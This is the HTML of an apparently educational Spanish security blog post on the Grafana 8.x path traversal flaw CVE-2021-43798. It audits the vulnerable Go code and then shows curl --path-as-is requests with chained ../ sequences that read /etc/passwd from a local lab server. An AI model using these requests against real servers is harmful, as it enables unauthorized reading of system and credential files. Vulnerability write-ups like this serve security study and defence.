<!DOCTYPE html>
<html lang="es">
<head>
	<title>CVE-2021-43798 | ØxBogart</title>

	<!-- meta -->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0,user-scalable=no,viewport-fit=cover">
	<link rel="icon" type="/image/png" href="/blog/img/skull.png">
	<link rel="canonical" href="https://0xbogarft.github.io/blog/hacking/CVE-2021-43798">
	<meta name="author" content="Bogart">
	<meta name="description" content="CVE-2021-43798">
	<meta name="keywords" content="CVE-2021-43798">

	<!-- Twitter Tags -->
	<meta property="og:title" content="CVE-2021-43798">
	<meta property="og:description" content="CVE-2021-43798">
	<meta property="og:url" content="https://0xbogart.github.io/blog/hacking/CVE-2021-43798">
	<meta property="og:image" content="https://0xbogart.github.io/blog/img/cve-2021-43798.jpg">
	<meta name="twitter:card" content="summary_large_image">
	<meta name="twitter:site" content="@jfb0gart">
	<meta name="twitter:creator" content="@jfb0gart">
	<meta name="twitter:title" content="CVE-2021-43798 | ØxBogart">
	<meta name="twitter:description" content="CVE-2021-43798 | ØxBogart">
	<meta property="twitter:image" content="https://0xbogart.github.io/blog/img/cve-2021-43798.jpg">		

	<!-- css -->
	<link rel="stylesheet" href="/css/bootstrap.min.css">
	<link rel="stylesheet" href="/css/ionicons.min.css">
	<link rel="stylesheet" href="/css/tabbared.css">
	<link rel="stylesheet" href="/css/sidebar.css">
	<link rel="stylesheet" href="/css/pace.css">
	<link rel="stylesheet" href="/css/custom.css">
	<link rel="stylesheet" href="/css/blackarchterm.css">
	<link rel="stylesheet" href="/css/blackarchvoid.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">

	<!-- js -->
	<script src="/js/jquery-2.1.3.min.js"></script>
	<script src="/js/bootstrap.min.js"></script>
	<script src="/js/pace.min.js"></script>
	<script src="/js/modernizr.custom.js"></script>
	<script src="/js/tabbar.js"></script>
	<script src="/js/sidebar.js"></script>
	<script src="/js/asredlight.js"></script>
<style>
@media (max-width: 600px) {
  .imgmax {
    max-height: 100%;
    width: 100%;
  }
}

.bg {
	border: 5px solid black;
	width: 100%;
	height: 100%;
}
</style>
</head>

<body class="bg">
	<div class="container">	
		<header id="site-header">
			<div class="row">
				<div style="margin-bottom: -10%;">
					<h1>H<a href="/blog/hacking"><img src="/blog/img/skullh.png" width="30px" height="40px" style="margin-top: -9px;"></a>CKING</h1>
				</div><!-- col-4 -->
			</div>
			<div class="row justify-content-end">
				<div class="col-1">
					<nav class="navbar navbar-expand-lg navbar-light">
						<button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#bs-example-navbar-collapse-1" aria-controls="bs-example-navbar-collapse-1" aria-expanded="false" aria-label="Toggle navigation">
							<span class="navbar-toggler-icon"></span>
						</button>
						<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
							<ul class="navbar-nav">
								<li class="nav-item">
									<a style="font-size: 25px;" class="nav-link" href="/index" data-hover="Home">Home</a>
								</li>
							</ul>
						</div><!--- .navbar-collapse --->
					</nav>
				</div><!-- col-md-8 -->
			</div>
		</header>
	</div>

	<div class="content-body">
		<!-- TABBAR -->
			<div style="position: sticky; top: -1px; width: auto;">
				<a onclick="toggleDropdown()">
					<div class="tabbar">
						<span style="font-weight: bold; float: left; margin-left: 10px;">TABLA DE CONTENIDO</span>
						<div class="dropdown-content" id="dropdownContent"></div>
					</div>
				</a>
			
				<div id="contenido">
					<h5>Grafana 8.X [CVE-2021-43798] Path Traversal</h5>
					<div style="border-top: 1px solid #000; width: 100%; margin: 10px 0;"></div>
					<a href="#HistoryTelling" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: larger">☠ HistoryTelling</p></a>
					<a href="#AUDIT" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: larger">☠ Auditando el Código Fuente</p></a>
					<a href="#EXPLOIT" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: larger">☠ Explotando la Vulnerabilidad [CVE-2021-43798]</p></a>
				</div>
			</div><!-- END TABBAR -->		

	<!--	<div id="main" style="position: sticky; top: 1px">
				<button class="openbtnred" onclick="openNav()">☠</button>  
			</div><br>
			<div id="mySidebar" class="sidebar" style="position: sticky; top: 1px;">
				<a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
				<span style="font-size: 25px; color: #ff0000;"><b>&nbsp;✎</b></span><span style="font-size: 25px; color: white;"> <b>Notas</b></span>
				<hr style="color: #DECD00;"><br>
				<a><span style="color: #E5D400;">Path Traversal</span><span class="spanx">: El recorrido de ruta o recorrido de directorio es una vulnerabilidad que permite a un atacante leer archivos arbitrarios en el servidor que ejecuta una aplicación.</span></a>
				<a><span style="color: #E5D400;">--path-as-is</span><span class="spanx">: Indica a cURL que no maneje secuencias de <b>/../</b> o <b>/./</b> en la  URL dada.<br>Normalmente curl los aplastará o fusionará según los estándares, pero con esta opción le dices que no lo haga.</span></a>
				<a><span style="color: #E5D400;">grafana.log</span><span class="spanx">: Archivo log que registra eventos relacionados con Grafana, ubicado en <b>/var/log/grafana/grafana.log</b> en Sistemas Linux\Unix</span></a>
			</div> -->
		
		<div class="container">
			<div class="row">
				<main class="col-md-8" style="margin-left: auto; margin-right: auto;">
					<article class="post post-1">
						<header  class="entry-header">
							<h1 class="blh1">Grafana 8.X [Path Traversal]</h1>
							<h2 class="blh2"><a style="color: #DB0000;">CVE</a>-<a style="color: #DB0000;">2021</a>-<a style="color: #DB0000;">43798</a></h2>
						</header>
						<div class="entry-content clearfix">
							<br><br>
							<section id="HistoryTelling">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">HISTORYTELLING</span>
								</div><br>
								<div class="leftl">
									<span>El <b>2 de Diciembre de 2021</b> el Ingeniero de Software e Investigador de Seguridad Jordy Versmissen ‘<b>J0VSEC</b>‘ reportó al equipo de <b>Grafana</b>, una vulnerabilidad de recorrido de ruta ‘<b>Path Traversal</b>‘ en la que un <b>usuario no autenticado</b> puede leer archivos en el host remoto.</span>
									<br><br>
									<span><b>El 3 de Diciembre de 2021</b>, el equipo de <b>Grafana</b> confirmó la vulnerabilidad haciendo saber también que <b>Grafana Cloud</b> no se había visto afectado.</span>
								</div>
							</section>
							
							<div style="border-top: 1px solid #000; width: 100%; margin: 10px 0;"></div>
								
							<!----- AUDITANDO
							EL CÓDIGO FUENTE ---->
							<section style="margin-top: 150px;" id="AUDIT">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">AUDITANDO EL CÓDIGO FUENTE</span>
								</div><br>
								<div class="leftl">
									<span>Al descargar el <b>SRC</b> de la web de Grafana y descomprimirlo, puede verse este fragmento de código en el fichero <b>/pkg/api/plugins.go</b></span>
								</div>
								
								<!---- AUDIT CODE ---->
								<div id="long-terminal">   
									  <!-- Terminal Body -->
									  <section id="terminal_body">
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="color: #00E4DD;">// GetPluginAssets returns public plugin assets (images, JS, etc)</span>
										</div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling" style="color: #00E4DD;">//</span>
										</div>
										  
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling" style="color: #00E4DD;">// /public/plugins/:pluginId/*</span>
										</div>
										  
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling"><a style="color: #F0E900;">func</a> <a style="color: #14DD00;">(hs *HTTPServer) GetPluginAssets(c *models.ReqContext) {</a></span>
										</div>
										  
										<div id="terminal__prompt">
											  <span id="terminal__prompt--bling">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a style="color: #14DD00;">pluginID := c.Params("pluginId")</a></span>
										</div>
										  
										<div id="terminal__prompt">
											  <span id="terminal__prompt--bling">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a style="color: #14DD00;">plugin := hs.PluginManager.GetPlugin(pluginID)</a></span>
										</div>
										  
										<div id="terminal__prompt">
											  <span id="terminal__prompt--bling">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a style="color: #F0E900;">if</a> <a style="color: #14DD00;">plugin == nil {</a></span>
										</div>
										  
										<div id="terminal__prompt">
											  <span id="terminal__prompt--bling">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a style="color: #14DD00;">c.Handle(hs.Cfg, 404, "Plugin not found", nil)</a></span>
										</div>
										  
										<div id="terminal__prompt">
											  <span id="terminal__prompt--bling">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a style="color: #F0E900;">return</a></span>
										</div>
										  
										<div id="terminal__prompt">
											  <span id="terminal__prompt--bling">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a style="color: #14DD00;">}</a></span>
										</div>
										  
										<div id="terminal__prompt">
											  <span id="terminal__prompt--bling">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a style="color: #14DD00;"><b>requestedFile := filepath.<a style="color: #ff0000;">Clean</a>(c.Params("*"))</b></a></span>
										</div>
										  
										<div id="terminal__prompt">
											  <span id="terminal__prompt--bling">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a style="color: #14DD00;"><b>pluginFilePath <a style="color: #ff0000;">:=</a> filepath.Join(plugin.PluginDir, requestedFile)</b></a></span>
										</div><br>
										  
										<div id="terminal__prompt">
											  <span id="terminal__prompt--bling"><b><a style="color: #14DD00; margin-left: 60px;">f, err := <a style="color: #ff0000;"><b>os.Open</b></a>(pluginFilePath)</a></b></span>
										</div>
									  </section>
								</div>
								
								<div class="leftl">
									<span><b><a style="color: #DB0000;">⦿</a> os.Open</b>: En el lenguaje <b>GO</b>, esta función abre el archivo con nombre para su lectura. Si tiene éxito, los métodos del archivo devuelto se pueden usar para leer. El descriptor de archivo asociado tiene el modo <b>O_RDONLY</b>. Si hay un error, será de tipo <b>* PathError</b>.</span><p></p>
									<span><b><a style="color: #DB0000;">⦿</a> pluginFilePath</b>: Esta variable obtiene la ruta del segmento URL, la pasa a la función filepath.Clean y la concatena con la configuración del directorio del plugin.</span>	
								</div><br>
								
								<div class="leftl">
									<span>El archivo de la variable <b>pluginFilePath</b> se abre y el contenido del archivo termina en la respuesta <b>HTTP</b> de la llamada <b>/public/plugins/&lt;pluginID&gt;/&lt;path&gt;</b></span>	
								</div>
								<!---- AUDIT CODE ---->

								<!--- pluginFilePath --->
								<div id="long-terminal">   
									  <!-- Terminal Body -->
									  <section id="terminal_body">
										<div id="terminal__prompt">
											  <span id="terminal__prompt--bling">&nbsp;<a style="color: #14DD00;">requestedFile := filepath.<a style="color: #FF0000;"><b>Clean</b></a>(c.Params("*"))</a></span>
										</div>
										  
										<div id="terminal__prompt">
											  <span id="terminal__prompt--bling">&nbsp;<a style="color: #14DD00;"><b>pluginFilePath <a style="color: #ff0000;">:=</a></b> filepath.Join(plugin.PluginDir, requestedFile)</a></span>
										</div><br>
										  
										<div id="terminal__prompt">
											  <span id="terminal__prompt--bling">&nbsp;<a style="color: #14DD00;">f, err := <a style="color: #FF0000;"><b>os.Open</b></a>(pluginFilePath)</a></span>
										  </div>
									  </section>
								</div>
								
								
								<!--- pluginFilePath --->
								<div class="leftl" style="margin-top: 20px;">
									<span><b><a style="color: #DB0000;">⦿</a> Clean</b>: En el lenguaje <b>GO</b>, esta función devuelve el nombre de ruta más corto equivalente a la ruta mediante un procesamiento puramente léxico. Aplica las siguientes reglas de forma iterativa hasta que no se puede realizar ningún otro procesamiento:</span>
								</div>
								<!----- AUDITANDO
								EL CÓDIGO FUENTE END ---->

								<div id="long-terminal">   
									  <!-- Terminal Body -->
									  <section id="terminal_body">
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling"><b>func Clean(path string) string</b></span>
										</div>
										  <br>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling"><b><a style="color: #DB0000;">• </a>Reemplazar varios elementos separadores por uno solo</b>.</span>
										</div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling"><b><a style="color: #DB0000;">• </a>Eliminar cada elemento del nombre de la ruta (el directorio actual)</b>.</span>
										</div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling"><b><a style="color: #DB0000;">• </a>Elimina cada elemento interno de nombre de ruta '<a style="color: #14DD00;"><b>..</b></a>' (el directorio padre)  junto con el elemento no '<a style="color: #14DD00;"><b>..</b></a>' que lo precede</b>.</span>
										</div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling"><b><a style="color: #DB0000;">• </a>Elimina los elementos '<a style="color: #14DD00;"><b>..</b></a>' que inician una ruta raíz, es decir: Sustituye '<a style="color: #14DD00;"><b>\..</b></a>' por '<a style="color: #14DD00;"><b>/</b></a>' al principio de una ruta, asumiendo que el separador es '<a style="color: #14DD00;"><b>/</b></a>'</b></span>
										</div>
									  </section>
									</div>
								</section>
							
							<div style="border-top: 1px solid #000; width: 100%; margin: 10px 0;"></div>
							<!-- END CLEAN GO -->
								
							<!--- EXPLOTANDO LA VUNLNERABILIDAD --->
							<section style="margin-top: 140px;" id="EXPLOIT">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">EXPLOTANDO LA VULNERABILIDAD CVE-2021-43798</span>
									<p></p>
										<span><b>Grafana 8.0.0-beta1</b> sobre un server <b>CentOS 8 Stream</b></span>
									</div>
									<p></p>
								
								<img src="/blog/hacking/img/welcome-grafana.png" class="imgmax" width="80%"><br><br>
								<div class="centext">
									<span><b>PLUGINS GRAFANA</b></span>
								</div>
								<p></p>
								
								<div class="left">
									<span><b>• </b>/public/plugins/alertlist/</span><br>
									<span><b>• </b>/public/plugins/annolist/</span><br>
									<span><b>• </b>/public/plugins/barchart/</span><br>
									<span><b>• </b>/public/plugins/bargauge/</span><br>
									<span><b>• </b>/public/plugins/candlestick/</span><br>
									<span><b>• </b>/public/plugins/cloudwatch/</span><br>
									<span><b>• </b>/public/plugins/dashlist/</span><br>
									<span><b>• </b>/public/plugins/elasticsearch/</span><br>
									<span><b>• </b>/public/plugins/gauge/</span><br>
									<span><b>• </b>/public/plugins/geomap/</span><br>
									<span><b>• </b>/public/plugins/gettingstarted/</span><br>
									<span><b>• </b>/public/plugins/grafana-azure-monitor-datasource/</span><br>
									<span><b>• </b>/public/plugins/graph/</span><br>
									<span><b>• </b>/public/plugins/heatmap/</span><br>
									<span><b>• </b>/public/plugins/histogram/</span><br>
									<span><b>• </b>/public/plugins/influxdb/</span><br>
									<span><b>• </b>/public/plugins/jaeger/</span><br>
									<span><b>• </b>/public/plugins/logs/</span><br>
									<span><b>• </b>/public/plugins/loki/</span><br>
									<span><b>• </b>/public/plugins/mssql/</span><br>
									<span><b>• </b>/public/plugins/mysql/</span><br>
									<span><b>• </b>/public/plugins/news/</span><br>
									<span><b>• </b>/public/plugins/nodeGraph/</span><br>
									<span><b>• </b>/public/plugins/opentsdb/</span><br>
									<span><b>• </b>/public/plugins/piechart/</span><br>
									<span><b>• </b>/public/plugins/pluginlist/</span><br>
									<span><b>• </b>/public/plugins/postgres/</span><br>
									<span><b>• </b>/public/plugins/prometheus/</span><br>
									<span><b>• </b>/public/plugins/stackdriver/</span><br>
									<span><b>• </b>/public/plugins/stat/</span><br>
									<span><b>• </b>/public/plugins/state-timeline/</span><br>
									<span><b>• </b>/public/plugins/status-history/</span><br>
									<span><b>• </b>/public/plugins/table/</span><br>
									<span><b>• </b>/public/plugins/table-old/</span><br>
									<span><b>• </b>/public/plugins/tempo/</span><br>
									<span><b>• </b>/public/plugins/testdata/</span><br>
									<span><b>• </b>/public/plugins/text/</span><br>
									<span><b>• </b>/public/plugins/timeseries/</span><br>
									<span><b>• </b>/public/plugins/welcome/</span><br>
									<span><b>• </b>/public/plugins/zipkin/</span><br>
								</div>
								<br>
								
								<div class="leftl">
									<span>Entre la variedad de plugins que Grafana trae en su instalación por defecto, lanzo una petición al servidor teniendo en cuenta el directorio de la función <b>GetPluginAssets</b> ‘<b>/public/plugins/:pluginId/</b>‘</span><p></p><br>
									<span>En esta petición incluyo un recorrido de ruta de <b>2</b> niveles ‘<b><a style="color: #DB0000;">../../</a></b>‘</span>
								</div>

								<div id="long-terminal">
									  <!-- Terminal Bar -->       
									  <section id="terminal__bar">          
										<div id="bar__buttons">            
										  <button class="bar__button" id="bar__button--exit">&#10005;</button>            
										  <button class="bar__button">&#9472;</button>                
										  <button class="bar__button">&#9723;</button>          
										</div>
									  </section>        
									  <!-- Terminal Body -->
									  <section id="terminal__body">
										<div id="terminal__prompt">
											<span id="terminal__prompt--location"><a style="color: #ff0000; margin-left:1px;">☠</a>&nbsp;</span>
										<span id="terminal__prompt--bling" style="color: #000;"><b>curl --<a style="color: #BE0000;">path</a>-<a style="color: #BE0000;">as</a>-<a style="color: #BE0000;">is</a> http://localhost<a style="color: #BE0000;">:</a>3000<a style="color: #BE0000;">/</a>public/plugins/postgres<a style="color: #BE0000;">/../../</a>ØxBogart</b></span>
										  </div><p></p>
										  
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling"><a style="color: #000"><b>&nbsp;&lt;title&gt;Grafana - Error&lt;/title&gt;</b></a></span>
										  </div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling"><a style="color: #000"><b>&nbsp;&lt;a class="text-link" href="login"&gt;Grafana&lt;/a&gt;&lt;span&gt;/Server Error&lt;/span&gt;&lt;span&gt;&lt;/span&gt;</b></a>&nbsp;</span>
										  </div>
										  
										   <div id="terminal__prompt">
											  <span id="terminal__prompt--bling"><a style="color: #000"><b>&nbsp;&lt;div class="alert-title"&gt;<a style="color: #BE0000;">Could not find plugin file</a><a style="color: #000;">&lt;/div&gt;</a></b></a></span>
										  </div><p></p>
										  
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling"><b><a style="color: #000">&lt;p&gt;</a><a style="color: #BE0000;">Check the Grafana server logs for the detailed error message</a><a style="color: #000">.&lt;/p&gt;</a></b></span>
										  </div>
									  </section>
									</div>
								
								<div class="leftl" style="margin-top: 20px;">
									<span>El fichero <b>log</b> de Grafana registra un error tras la petición curl, que indica no encontrar la versión del plugin solicitado en la ruta <b>/usr/share/grafana/public/app/plugins/</b></span>
								</div>
								
								<div id="long-terminal">   
									  <!-- Terminal Body -->
									  <section id="terminal_body">
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling">&nbsp;<b>lvl=error msg="Could not find plugin file" logger=context userId=0</b></span>
										  </div>
										  
										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling">&nbsp;<b>uname= error="<a style="color: #ff0000;">open</a> /usr/share/grafana/public<a style="color: #ff0000;">/app/</a>plugins/ØxBogart: no such file or directory"</b></span><p></p>
										</div>
									  </section>
								</div>
								
								<div class="leftl" style="margin-top: 50px;">
									<span>Al hacer la misma petición pero esta vez con un recorrido de ruta de <b>5 niveles</b>, el error registrado en el log sitúa la búsqueda de la petición en <b>/usr/share/grafana</b></span>
								</div>
								<!--- SEGUNDO CURL --->
								<div id="long-terminal">
									  <!-- Terminal Bar -->       
									  <section id="terminal__bar">          
										<div id="bar__buttons">            
										  <button class="bar__button" id="bar__button--exit">&#10005;</button>            
										  <button class="bar__button">&#9472;</button>                
										  <button class="bar__button">&#9723;</button>          
										</div>
									  </section>        
									  <!-- Terminal Body -->
									  <section id="terminal__body">
										<div id="terminal__prompt">
											<span id="terminal__prompt--location"><a style="color: #ff0000; margin-left:1px;">☠</a>&nbsp;</span>
										<span id="terminal__prompt--bling" style="color: #000;"><b>curl --<a style="color: #BE0000;">path</a>-<a style="color: #BE0000;">as</a>-<a style="color: #BE0000;">is</a> http://localhost<a style="color: #BE0000;">:</a>3000<a style="color: #BE0000;">/</a>public/plugins/postgres<a style="color: #BE0000;">/../../../../../</a>ØxBogart</b></span>
										  </div><p></p>
									  </section>
									</div>
								<!--- END SEGUNDO CURL --->

								<!--- SEGUNDO LOG --->
								<div id="long-terminal">   
									  <!-- Terminal Body -->
									  <section id="terminal_body">
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling">&nbsp;<b>lvl=error msg="Could not find plugin file" logger=context userId=0</b></span>
										  </div>

										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling">&nbsp;<b>uname= error="<a style="color: #ff0000;">open</a> /usr/share/grafana/ØxBogart: no such file or directory"</b></span><p></p>
										</div>
									  </section>
								</div>
								<!--- END SEGUNDO LOG --->

								<div class="leftl" style="margin-top: 50px;">
									<span>Lo que lleva a la conclusión de que si se añaden 3 niveles más al recorrido de ruta, la petición se ubica en la partición raíz <b>/</b> permitiendo leer ficheros sensibles del sistema como <b>/etc/passwd</b></span>
								</div>
								
								<!--- /etc/passwd --->
								<div id="long-terminal">
									  <!-- Terminal Bar -->       
									  <section id="terminal__bar">          
										<div id="bar__buttons">            
										  <button class="bar__button" id="bar__button--exit">&#10005;</button>            
										  <button class="bar__button">&#9472;</button>                
										  <button class="bar__button">&#9723;</button>          
										</div>
									  </section>        
									  <!-- Terminal Body -->
									  <section id="terminal__body">
										<div id="terminal__prompt">
											<span id="terminal__prompt--location"><a style="color: #ff0000; margin-left:1px;">☠</a>&nbsp;</span>
										<span id="terminal__prompt--bling" style="color: #000;"><b>curl --<a style="color: #BE0000;">path</a>-<a style="color: #BE0000;">as</a>-<a style="color: #BE0000;">is</a> http://localhost<a style="color: #BE0000;">:</a>3000/public/plugins/postgres<a style="color: #BE0000;">/../../../../../../../../</a>etc/passwd</b></span>
										  </div><p></p>
										  
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling" style="color: #000;"><b>root:x:0:0::/root/bin/bash</b></span>
										  </div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling" style="color: #000;"><b>bin:x:1:1::/:/usr/bin/nologin</b></span>
										  </div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling" style="color: #000;"><b>daemon:x:2:2::/:/usr/bin/nologin</b></span>
										  </div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling" style="color: #000;"><b>mail:x:8:12::/var/spool/mail:/usr/bin/nologin</b></span>
										  </div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling" style="color: #000;"><b>ftp:x:14:11::/srv/ftp:/usr/bin/nologin</b></span>
										  </div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling" style="color: #000;"><b>http:x:33:33::/srv/http:/usr/bin/nologin</b></span>
										  </div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling" style="color: #000;"><b>nobody:x:65534:65534:Nobody:/:/usr/bin/nologin</b></span>
										  </div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling" style="color: #000;"><b>named:x:40:40:BIND DNS Server:/:/usr/bin/nologin</b></span>
										  </div>
										  <div id="terminal__prompt">
											  <span id="terminal__prompt--bling" style="color: #000;"><b>grafana:x:900:986:grafana user:/usr/share/grafana:/sbin/nologin</b></span>
										  </div>
									  </section>
								</div>
							</section>
							<!--- /etc/passwd --->
						</div>
					</article>
				</main>
			</div>
		</div>
	</div>
						
	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<div class="copyright">
						<a class="nodeco" href="/index"><img src="/blog/img/0xbogart-shadow.png" style="width: 15%"></a>
					</div>
				</div>
			</div>
		</div>
	</footer>
	<a href="#" id="scrollToTopButtonRed"><i class="fas fa-arrow-up"></i></a>
</body>
</html>
